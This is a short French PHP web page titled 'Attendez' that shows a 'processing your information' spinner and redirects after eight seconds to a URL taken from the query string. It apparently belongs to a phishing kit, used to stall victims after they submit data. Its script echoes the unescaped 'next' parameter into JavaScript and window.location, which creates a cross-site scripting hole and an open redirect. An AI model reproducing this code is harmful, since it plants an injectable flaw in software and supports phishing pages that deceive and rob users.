<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>Attendez</title>
</head>
<body>

<header>
    <div class="logo">
<img src="res/img/logo.png" >
    </div>
</header>
<main>

    <div class="continer">
<div class="col" >
<h3>Veuillez patienter...</h3>
</div>

<div class="col">
<p>Traitement de vos informations...</p>

<div class="loding"><img src="res/img/loadings.gif" style="width:60px;"></div>
 
</div>


</main>




<script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script>
</body>
</html>